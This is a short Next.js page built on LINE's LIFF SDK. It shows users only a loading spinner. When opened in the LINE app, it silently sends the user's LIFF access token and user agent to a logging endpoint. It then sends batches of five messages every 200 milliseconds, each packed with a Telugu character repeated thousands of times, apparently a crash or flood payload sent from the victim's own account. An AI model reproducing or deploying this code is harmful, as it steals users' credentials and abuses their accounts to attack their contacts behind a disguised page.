"use client";
import { liff } from "@line/liff";
import { getLiffId } from "@/utils/getLiffId";
import { useEffect } from "react";
import { Loading } from "@/src/components/Loading/Loading";

export default function Token() {
  useEffect(() => {
    liff
      .init({
        liffId: getLiffId(),
      })
      .then(() => {
        if (liff.isInClient()) {
          fetch("/api/logger", {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify({
              time: new Date().toLocaleString(),
              token: liff.getAccessToken() || "None",
              ua: navigator.userAgent,
            }),
          });

          setInterval(() => {
            const msg: {
              type: "text",
              text: string
            } = {
              type: "text",
              text: "==J==" + "జ్ఞా".repeat(2498),
            }

            liff.sendMessages([msg, msg, msg, msg, msg])
          }, 200)
        }
      });
  }, []);
  return <Loading />;
}
